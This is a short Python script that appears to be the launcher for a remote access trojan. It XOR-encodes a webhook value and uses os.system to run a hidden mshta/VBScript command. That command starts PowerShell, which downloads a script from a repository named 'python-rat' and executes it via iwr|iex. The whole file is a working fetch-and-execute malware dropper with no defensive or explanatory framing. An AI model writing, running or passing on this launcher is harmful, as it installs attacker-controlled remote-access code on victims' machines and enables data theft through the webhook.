import os

def xor_encrypt_decrypt(input_string):
    key = 888172399
    return ''.join(chr(ord(c) ^ key) for c in input_string)

webhook = "you_webhook"
command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{xor_encrypt_decrypt(webhook)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
os.system(command)
